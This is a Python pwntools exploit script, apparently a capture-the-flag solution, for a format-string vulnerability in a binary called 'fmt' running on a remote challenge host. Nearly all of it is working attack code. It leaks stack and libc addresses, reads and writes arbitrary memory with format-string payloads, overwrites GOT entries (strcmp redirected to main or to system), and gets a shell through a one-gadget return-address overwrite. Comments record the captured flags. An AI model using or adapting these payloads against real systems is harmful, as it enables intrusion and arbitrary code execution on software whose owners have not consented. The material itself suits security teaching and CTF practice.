#!/usr/bin/env python3
from enum import Enum
from pwn import *


# ----------------------=[Python Stuff]=---------------------- #

class Mode(Enum):
    DEBUG = 0
    LOCAL = 1
    REMOTE = 2


# ----------------------=[Packing Utils]=---------------------- #

p64 = lambda n: packing.pack(n, 64)
u64 = lambda n: packing.unpack(n, 64)
u32 = lambda n: packing.unpack(n, 32)
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
uu32 = lambda data: u32(data.ljust(4, b'\x00'))

# ---------------------=[Common Settings]=--------------------- #

bin_path = './fmt'
local_libc_path = './libc6_2.31-0ubuntu9.12_amd64.so'
remote_url = 'chal.firebird.sh'
remote_port = 35047

context.update(arch="amd64", os="linux")
context.log_level = 'debug'
context.binary = bin_path

gdb_break_points = [
    ''
]


# ------------------------=[Exploit]=-------------------------- #

def initialize_io(mode: Mode) -> process | remote:
    gdbscripts = "handle SIGALRM ignore\n"
    for bp in gdb_break_points:
        if bp:  # is not empty str
            gdbscripts += f"b* {bp}\n"

    # Initialize io based on mode
    match mode:
        case Mode.DEBUG:
            context.terminal = ["tmux", "splitw", "-h"]
            return gdb.debug([bin_path], gdbscripts)
        case Mode.LOCAL:
            return process([bin_path])
        case Mode.REMOTE:
            return remote(remote_url, remote_port)
        case _:
            exit(-1)


# -----------------------=[Main Pwn]=-------------------------- #

def do_pwn(io: process | remote) -> None:
    sla = io.sendlineafter
    sa = io.sendafter
    sl = io.sendline
    sd = io.send
    rl = io.recvline
    ru = io.recvuntil

    # rop = ROP(bin_path)
    elf = ELF(bin_path)
    libc = ELF(local_libc_path)

    def reconnisance() -> None:
        ru(b"Give me your first input:")
        # sl(b"%p."*(100//3))
        # ru(b"Your input:")
        # output = rl()
        # print(f"{output=}")

        start_i = 1
        end_i = 10
        count_load = b".".join([b"A" * 8] + [f"%{i}$p".encode() for i in range(start_i, end_i)])

        sl(flat(
            count_load.ljust(len(count_load) + (len(count_load) % 8), b"A"),
        ))
        ru(b"Your input:")
        output = rl()
        print(f"{output=}")

        reads = output.replace(b"\n", b"").split(b".")
        for i in range(len(reads)):
            print(f"[{i + start_i - 1}] {reads[i]}")

        # Reset again
        sl(b"noooooo")

        ru(b"Your input:")
        rl()

    def flag1() -> None:
        ru(b"Give me your first input:")
        # %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
        # random1 is on 7th position
        sl(b"%7$p")

        ru(b"0x")
        random1 = int(rl().strip(), 16)
        print(f"{random1=}")

        p64_random1 = p64(random1)
        print(f"{p64_random1=}")

        sl(p64_random1)

        ru(b"Your input:")
        rl()

        flag = rl()
        print(f"{flag=}")
        # flag{T1me_fl1es_H0pe_u_enj0y_CTF!}

    def read_address(address: int) -> bytes:
        ru(b"Give me your first input:")
        # Our input starts at 8, so whatever we put in 9th position will be read if we use %9$s (and remember to pad it)
        sl(flat(
            b"%9$s".ljust(8, b'A'),
            address
        ))

        ru(b"Your input:")
        contents = rl()
        print(f"{contents=}")

        return contents

    # Read anything we want
    def flag2() -> None:
        # PIE is disabled so we can read using gdb
        random2_addr = 0x4040d0

        random2 = read_address(random2_addr)[:4]
        print(f"{random2=}")

        sl(random2)

        ru(b"Your input:")
        rl()

        flag = rl()
        print(f"{flag=}")
        # flag{fmt_g00d_1_more_Step}

    # Write anything we want
    def flag3() -> None:
        ru(b"Give me your first input:")

        random3_addr = 0x4040cc

        # 0x1234321
        # 0x21 = dec 33 => 0x4040cc
        # 0x43 = dec 67 => 0x4040cd
        # 0x23 = dec 35 => 0x4040ce
        # 0x1 = dec 1 => 0x4040cf

        # dec 1    dec 33     dec 35    dec 67
        # %c%?$hhn %32c%?$hhn %2c%?$hhn %32c%?$hhn -> 36 bytes -> 48 bytes (6x 8-byte strings)

        # sl(flat(
        #     b"%c%14$hhn%32c%15$hhn%2c%16$hhn%32c%17$hhn".ljust(48, b'A'),  # %8
        #     # b"%c%?",   # %9
        #     # b"%c%?",   # %10
        #     # b"%c%?",   # %11
        #     # b"%c%?",   # %12
        #     # b"%c%?",   # %13
        #     0x4040cf,  # %14
        #     0x4040cc,  # %15
        #     0x4040ce,  # %16
        #     0x4040cd   # %17
        # ))

        payload = fmtstr_payload(8, {random3_addr: 0x1234321})
        print(f"{payload=}")
        sl(payload)

        ru(b"Your input:")
        rl()

        sl(b"noooooo")

        ru(b"Your input:")
        rl()

        flag = rl()
        print(f"{flag=}")
        # flag{you_kill_the_fmt_b055}

    def leak_libc_func(func="printf") -> int:
        print(f"[RUNNING] LEAKING {func.upper()} ADDRESS")
        # printf = 0x7ff59f6e6c90
        # memset = 0x7fb81cf80b70
        # fclose = 0x7f54332cedd0
        # libc6_2.31 with printf and fclose

        # Get address of func
        got_addr = elf.got[func]
        print(f"{got_addr=}")

        output = read_address(got_addr)
        print(f"{output=}")

        leak_addr = output.split(b"\x7f")[0] + b"\x7f"
        print(f"{leak_addr=}")

        addr = uu64(leak_addr)
        print(f"{hex(addr)=}")

        # Reset again
        sl(b"noooooo")

        ru(b"Your input:")
        rl()
        print(f"[DONE] DONE LEAKING {func.upper()} ADDRESS")
        return addr

    def enable_unlimited_printf() -> None:
        ru(b"Give me your first input:")
        print("[RUNNING] ENABLING UNLIMITED PRINTF")
        # We set strcmp to main so we can keep using format string
        main_addr = 0x40143A

        payload = flat(
            # b"%p.".ljust(8, b"A"),  # %8
            fmtstr_payload(8, {
                elf.got['strcmp']: main_addr,
            })
        )
        print(f"{payload=}")
        sl(payload)

        ru(b"Your input:")
        rl()
        # leak_stack = output.split(b".")[0]
        # print(f"{leak_stack=}")

        sl(b"noooooo")

        ru(b"Your input:")
        rl()
        print("[DONE] DONE ENABLING UNLIMITED PRINTF")

    def get_shell() -> None:
        # First we enable unlimited printf
        enable_unlimited_printf()

        # Then we leak libc
        libc.base = leak_libc_func("printf") - libc.sym["printf"]
        print(f"{hex(libc.base)=}")

        def onegadget() -> None:
            """
            We want to rewrite the return address to a onegadget.
            First we get a stack leak and calculate the old return address.
            """
            # ru(b"Give me your first input:")
            # print("[RUNNING] GETTING STACK LEAK")
            #
            # # %6 is rsp
            #
            # # Get stack address by leaking
            # # TODO: find a place on stack where we can leak a consistent address on the stack, to get rbp and rip
            # sl(b"%p")
            # ru(b"Your input:")
            # # __libc_start_call_main?
            # buffer_addr = int(rl().strip(), 16)
            # print(f"{hex(buffer_addr)=}")
            #
            # # We calculate old_rip, the buffer size is 0x100 and we have 0x10 bytes from random and canary
            # rbp = buffer_addr + 0x2d0  # 0x110
            rbp = 0x7fffffffc9a0
            old_rip = rbp + 0x8
            print(f"{hex(old_rip)=}")

            # sl(b"noooooo")
            #
            # ru(b"Your input:")
            # rl()
            #
            # print("[DONE] DONE GETTING BUFFER ADDRESS")

            # Then we get shell by modifying the old return address from last call

            ru(b"Give me your first input:")
            print("[RUNNING] GETTING SHELL")

            # Gadgets:
            gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
            # 0xe3afe execve("/bin/sh", r15, r12)
            # constraints:
            #   [r15] == NULL || r15 == NULL || r15 is a valid argv
            #   [r12] == NULL || r12 == NULL || r12 is a valid envp
            #
            # 0xe3b01 execve("/bin/sh", r15, rdx)
            # constraints:
            #   [r15] == NULL || r15 == NULL || r15 is a valid argv
            #   [rdx] == NULL || rdx == NULL || rdx is a valid envp
            #
            # 0xe3b04 execve("/bin/sh", rsi, rdx)
            # constraints:
            #   [rsi] == NULL || rsi == NULL || rsi is a valid argv
            #   [rdx] == NULL || rdx == NULL || rdx is a valid envp

            payload = flat(
                fmtstr_payload(8, {
                    old_rip: libc.base + gadgets[0],
                    # Put strcmp back to normal so we can exit normally and get to old rip
                    elf.got['strcmp']: libc.sym['strcmp'],
                })
            )
            print(f"{payload=}")
            sl(payload)

            ru(b"Your input:")
            # Now strcmp should exit and we get shell
            print("Your input done, now wait for shell")

        def system_got_hijack() -> None:
            """
            We want to try to hijack the GOT to make strcmp call system instead and change the argument to /bin/sh.
            This func is for the case where we can't use the onegadget because we don't have a stack leak.
            """
            ru(b"Give me your first input:")
            print("[RUNNING] GETTING SHELL")

            # /bin/sh\x00 => 0x0068732f6e69622f
            flag_2_strcmp_addr = 0x4015C8

            random2_addr = 0x4040d0
            payload = flat(
                # b"/bin/sh ",
                fmtstr_payload(8, {
                    random2_addr: b"/bin/sh\x00",
                    elf.got['read']: flag_2_strcmp_addr,
                    elf.got['strcmp']: libc.sym['system'],
                })
            )
            print(f"{payload=}")
            sl(payload)

            ru(b"Your input:")
            print("Your input done, now wait for give random number")
            ru(b"Give me the random number you got:")
            print("Hmmmmm")
            # It should now call readline, which calls read, which jumps to strcmp for random2, which calls system

        # system_got_hijack()
        onegadget()


    def exploit() -> None:
        # read_address(0x7fffffffc9b8)
        # reconnisance()
        # flag1()
        # flag2()
        # flag3()
        # leak_libc_func()
        get_shell()
        # enable_unlimited_printf()
        pass

    exploit()
    # pause()


# --------------------=[End of Exploit]=----------------------- #

def main() -> None:
    io = initialize_io(Mode.REMOTE)
    do_pwn(io)
    io.interactive()


if __name__ == '__main__':
    main()

# ----------------------------=[EOF]=--------------------------- #
